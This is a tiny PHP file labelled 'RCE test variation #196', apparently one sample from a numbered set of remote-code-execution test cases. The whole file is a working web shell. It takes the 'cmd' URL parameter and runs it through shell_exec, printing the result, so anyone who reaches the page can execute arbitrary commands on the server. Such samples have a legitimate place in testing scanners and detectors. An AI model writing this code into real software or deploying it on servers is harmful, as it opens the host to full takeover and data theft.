<?php
// RCE test variation #196
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>